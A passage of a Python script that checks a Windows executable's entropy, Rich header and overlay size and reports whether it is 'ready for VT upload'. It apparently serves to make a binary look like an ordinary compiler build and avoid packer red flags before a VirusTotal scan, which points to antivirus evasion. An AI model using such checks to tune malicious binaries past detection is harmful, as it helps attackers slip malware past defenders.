    print(f"    Entropy: {_ent} [RED FLAG — too high, suggests packed/encrypted]")
else:
    print(f"    Entropy: {_ent} [OK — 5.0-7.5 sweet spot]")

# 7f: Rich header presence
_rich_found = _vd.find(b'Rich') >= 0
print(f"    Rich header: {'Present (good — looks like MSVC build)' if _rich_found else 'MISSING (RED FLAG — no compiler signature)'}")

# 7g: Import table check
print(f"\n{'='*50}")
print("Validation complete.")
if _vsec_ok and not crt_found and _overlay_size <= 512 and 5.0 <= _ent <= 7.5:
    print("\n🟢 All checks PASSED — ready for VT upload.")
else:
    print("\n🔴 Some checks FAILED — review before uploading.")
